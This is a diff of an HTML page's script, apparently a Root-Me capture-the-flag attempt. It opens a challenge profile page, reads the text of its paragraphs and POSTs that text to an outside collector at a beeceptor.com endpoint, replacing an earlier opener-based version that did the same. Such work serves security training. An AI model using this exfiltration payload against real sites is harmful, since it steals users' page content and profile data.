@@ -9,35 +9,38 @@
 <body id="body">
   <script>
     
-  setTimeout(() => {
-  // Vérifie si l'opener est disponible
-  if (redirection && redirection.opener) {
-    const paragraphs = redirection.opener.document.querySelectorAll('p');
+  // Ouvrir une nouvelle fenêtre
+const newWindow = window.open('http://challenge01.root-me.org:58003/profile');
 
-    console.log(paragraphs)
-    let text = "";
+// Attendre 1 seconde avant d'exécuter le reste du code
+setTimeout(() => {
+  if (newWindow) {
+    try {
+      // Récupérer tous les paragraphes de la nouvelle fenêtre
+      const paragraphs = newWindow.document.querySelectorAll('p');
+      let text = "";
       
-    // Récupérer tout le texte des balises <p>
-    paragraphs.forEach(paragraph => {
-      text = text + paragraph.textContent + "\n";
-    });
-      
-    fetch("https://volatile.free.beeceptor.com", {
-      method: "POST",  // Utiliser POST pour envoyer des données
-      headers: {
-        "Content-Type": "application/json",  // Spécifier le type de contenu
-      },
-      body: JSON.stringify({
-        text: text,  // Envoyer le texte récupéré
-      })
-    })
-      .then(response => response.json())  // Traiter la réponse
-      .then(data => {
-        console.log('Réponse du serveur:', data);
-      })
-      .catch(error => {
-        console.error('Erreur:', error);
+      paragraphs.forEach(paragraph => {
+        text += paragraph.textContent + "\n";
       });
+      
+      // Envoyer les données au serveur
+      fetch("https://volatile.free.beeceptor.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ text })
+      })
+      .then(response => response.json())
+      .then(data => console.log('Réponse du serveur:', data))
+      .catch(error => console.error('Erreur lors de la requête:', error));
+    } catch (error) {
+      console.error('Erreur lors de l\'accès au contenu:', error);
+      // Gestion de l'erreur de politique de même origine (CORS)
+    }
+  }
+}, 1000); // Délai d'une seconde
       
   </script>
 </body>
